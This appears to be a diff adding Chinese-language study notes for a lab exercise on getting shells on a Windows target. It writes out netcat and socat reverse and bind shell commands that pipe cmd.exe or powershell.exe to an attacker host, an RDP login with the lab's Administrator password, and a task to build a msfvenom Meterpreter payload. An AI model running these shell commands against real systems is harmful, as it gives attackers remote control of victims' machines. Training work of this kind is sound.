@@ -44,3 +44,33 @@
   - 使用新用户登录 `xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.10.91.116 /u:test /p:'test123'`
 
 5. 要求：尝试使用 socat 和 netcat 在 Windows 目标上获得反向和绑定 shell。
+ netcat反向shell
+    - 目标机ip：10.10.234.86    攻击机ip：10.10.249.251
+    - Netcat反向shell, 在攻击者终端:`nc -lvnp 12345`
+    - 然后使用 RDP 登录到目标的管理员账户,使用攻击机终端 通过RDP登录到目标系统的管理员账户
+  `xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.10.234.86 /u:Administrator /p:'TryH4ckM3!'`
+    - 在 cmd 上输入以下内容:nc 10.10.249.251 12345 -e"cmd.exe"
+    - 返回刚才创建的shell查看，成功建立netcat反向shell
+
+  netcat绑定shell  
+   - 现在正好相反，在目标机的cmd上启动一个 netcat 监听器: 
+      `nc -lvnp 12345 -e "cmd.exe"  # -e和"cmd.exe"之间有空格和没有空格 执行结果一样`
+   - 在攻击者的电脑上运行以下命令: `nc 10.10.234.86 12345`
+   - 成功绑定shell  
+   
+ Socat绑定shell
+  - 在目标机器的 cmd 上启动一个监听器（注意：socat监听器在执行监听时没有提示语）:   
+  `socat TCP-L:12345 EXEC:powershell.exe,pipes`
+  - 然后在攻击者的电脑上  
+  `socat TCP:10.10.234.86:12345 -`
+  - 成功绑定shell  
+
+ Socat反向shell
+  - 在攻击者的终端上设置socat监听器（注意：socat监听器在执行监听时没有提示语）:  
+  `socat TCP-L:12345 -`
+  - 然后在目标机器的 cmd 中运行以下命令
+  `socat TCP:10.10.249.251:12345 EXEC:powershell.exe,pipes`
+  - 成功建立Socat反向shell  
+
+6. 使用 msfvenom 创建 64 位 Windows Meterpreter shell 并将其上传到 Windows Target。激活 shell 并使用 multi/handler 捕获它。尝试一下这个 shell 的功能。
+   
